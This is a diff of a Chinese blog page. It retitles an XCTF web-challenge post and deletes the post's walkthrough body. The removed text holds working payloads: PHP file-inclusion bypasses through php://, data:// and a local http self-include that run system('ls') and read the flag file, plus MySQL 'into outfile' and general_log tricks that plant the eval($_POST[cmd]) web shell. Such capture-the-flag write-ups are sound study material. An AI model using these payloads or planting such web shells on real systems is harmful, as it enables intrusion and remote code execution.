@@ -151,7 +151,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/12/04/XCTF-Web进阶(二)/">微信聊天记录导出教程</a>
+      <a class="article-title" href="/2019/12/04/XCTF-Web进阶(二)/">XCTF-Web进阶(二)</a>
     </h1>
   
 
@@ -172,155 +172,9 @@
 </ul>
 <h4 id="解法一-源码审计之文件包含"><a href="#解法一-源码审计之文件包含" class="headerlink" title="解法一: 源码审计之文件包含"></a>解法一: 源码审计之文件包含</h4><p>过滤源码如下:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo $_GET[&apos;hello&apos;];</span><br><span class="line">$page=$_GET[&apos;page&apos;];</span><br><span class="line">while (strstr($page, &quot;php://&quot;)) &#123;</span><br><span class="line">    $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);</span><br><span class="line">&#125;</span><br><span class="line">include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>背景知识</strong>:</p>
-<ul>
-<li><p>strstr()</p>
-<p>查找 “world” 在 “Hello world!” 中是否存在，如果是，返回该字符串及后面剩余部分：</p>
-</li>
-<li><p>str_replace(a, b, c)</p>
-<p>在c字符串中, 用b来替换掉c</p>
-</li>
-</ul>
-<h5 id="1-php-大小写绕过"><a href="#1-php-大小写绕过" class="headerlink" title="1. php:// 大小写绕过"></a>1. php:// 大小写绕过</h5><p><font color="red">php://伪协议格式要求</font></p>
-<p>​        a. php://input<code>作为参数输入, 如</code>?page=php://input`</p>
-<p>​        b. POST输入数据区域, 输入php代码, 如 <code>&lt;?php system(&quot;ls&quot;);?&gt;</code></p>
-<ul>
-<li><p>利用如下</p>
-</li>
-<li><p>while函数是匹配<code>php://</code>, 并没有做大小写过滤, 可以利用这一点绕过<code>while</code>语句, 直接进入<code>include</code>包含函数</p>
-</li>
-<li><p>利用如下, 打开burpsuite, 修改成如下数据</p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/6.png" alt="6"></p>
-</li>
-<li><p>看到了flag文件, 直接进行读取</p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/7.png" alt="7"></p>
-</li>
-</ul>
-<h5 id="2-http-127-0-0-1-本地读取"><a href="#2-http-127-0-0-1-本地读取" class="headerlink" title="2. http ://127.0.0.1 本地读取"></a>2. <font color="red">http ://127.0.0.1 本地读取</font></h5><ul>
-<li><p>利用目录扫描工具, 能够直接发现当前页面是<code>index.php</code></p>
-<p>因此就利用本地读取, 再次读取当前页面, 将操作函数赋值给hello</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/8.png" alt="8"></p>
-</li>
-<li><p>利用show_source函数, 输出flag文件的值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/9.png" alt="9"></p>
-</li>
-</ul>
-<h5 id="3-data-伪协议的利用"><a href="#3-data-伪协议的利用" class="headerlink" title="3. data:// 伪协议的利用"></a>3. data:// 伪协议的利用</h5><p><font color="red">data://伪协议格式要求</font></p>
-<p>​        a. data://<code>资源类型</code> ; <code>编码</code> , <code>内容</code></p>
-<p>​        b. 添加编码为base64时, 记住, 不能添加<code>;</code>, 即<code>&lt;?php phpinfo()?&gt;</code> 没有 <code>;</code></p>
-<ul>
-<li><p>是否可以换一个思路, 利用data:// 伪协议来获取flag</p>
-<p>获取文件目录,  </p>
-<p><code>echo $_SERVER[&#39;DOCUMENT_ROOT&#39;];</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain,%3C?php%20echo%20$_SERVER[%27DOCUMENT_ROOT%27];?%3E</span><br><span class="line"></span><br><span class="line">或添加编码类型 ,base64</span><br><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain;base64,PD9waHAgZWNobyAkX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdPz4=</span><br></pre></td></tr></table></figure>
-
-<p>获得目录名, <code>var/www</code></p>
-</li>
-<li><p>获取当前目录下的文件</p>
-<ul>
-<li><p>scandir()函数, 获取目录下的文件名</p>
-</li>
-<li><p>print_r()函数, 将scandir()函数获取的输出</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain,%3C?php%20print_r(scandir(%27/var/www%27));?%3E</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>输出文件内容</p>
-<ul>
-<li>file_get_contents()函数, 获取文件内容</li>
-</ul>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:48772/index.php?page=data://text/plain,%3C?php%20$a_code%20=%20file_get_contents(%27fl4gisisish3r3.php%27);%20echo%20htmlspecialchars($a_code);?%3E</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<h4 id="解法二-SQL注入shell"><a href="#解法二-SQL注入shell" class="headerlink" title="解法二: SQL注入shell"></a><strong>解法二: SQL注入shell</strong></h4><ul>
-<li><p>先用目录扫描工具, 扫描一下网站</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://111.198.29.45:48772/ -e *</span><br></pre></td></tr></table></figure>
-
-<p>其结果如下</p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/1.png" alt="1"></p>
-<p>发现, 后台, 进入后台, 发现是空密码直接回车就可以进入后台</p>
-</li>
-<li><p>发现有一个数据库是空数据库, 名字为<code>test</code></p>
-<p>那么这里我们就有两个经典老套思路</p>
-<p><font color="red">1. 通过mysql的<code>outfile</code>写入shell</font></p>
-<p><font color="red">2. 通过日志拿 shell</font></p>
-</li>
-</ul>
-<h5 id="1-mysql写入shell"><a href="#1-mysql写入shell" class="headerlink" title="1. mysql写入shell"></a>1. mysql写入shell</h5><ul>
-<li><p>因为用目录扫描工具扫描到了, <code>phpinfo</code>, 可以搜索一下web目录</p>
-<p>control+f 搜索 <code>document_root</code></p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/2.png" alt="2"></p>
-<p>这样就知道了, 一会<code>outfile</code>函数所需要的函数了</p>
-</li>
-<li><p>到<code>test</code>数据库下进行SQL插叙, 插入语句</p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/3.png" alt="3"></p>
-</li>
-<li><p>依次执行</p>
-<ul>
-<li><p>建立temp表，里面就一个cmd字段</p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE temp(cmd text NOT NULL)</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>把一句话木马插入到temp表</p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Insert INTO temp (cmd) VALUES(&apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos;)</span><br></pre></td></tr></table></figure>
-
-
-
-</li>
-</ul>
-<ul>
-<li><p>查询temp表中的一句话并把结果导入到shell.php</p>
-</li>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select cmd from temp into outfile &apos;/var/www/shell.php&apos;</span><br></pre></td></tr></table></figure>
-
-<p>执行到这里的时候, 发现报错了, 猜测应该是没有权限写入</p>
-<p>既然没有权限, 那我们就试试常用的 <code>tmp</code> 目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select cmd from temp into outfile &apos;/tmp/shell.php&apos;</span><br></pre></td></tr></table></figure>
-
-<p>发现成功写入</p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/4.png" alt="4"></p>
-</li>
-<li><p>打开菜刀, 连接尝试</p>
-<p>地址: <code>http://111.198.29.45:48772/index.php?page=../../../../tmp/shell.php</code></p>
-<p>连接密码: <code>cmd</code></p>
-</li>
-<li><p>成功发现flag</p>
-<p><img src="/2019/12/04/XCTF-Web进阶(二)/5.png" alt="5"></p>
-</li>
-</ul>
-<h5 id="2-日志拿-shell"><a href="#2-日志拿-shell" class="headerlink" title="2. 日志拿 shell"></a>2. 日志拿 shell</h5><ul>
-<li><p>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&apos;on&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>general log file 指的是日志的保存路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&apos;/tmp/log.php&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>利用日志的记录插入一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>菜刀连接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:37211/index.php?page=../../../../tmp/log.php</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-
+        
+          <a class="article-more-a" href="/2019/12/04/XCTF-Web进阶(二)/#more">more >></a>
+        
       
 
       
@@ -1174,11 +1028,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
+                <a href="javascript:void(0)" class="js-tag color4">大数据</a>
               </li>
              
               <li class="article-tag-list-item">
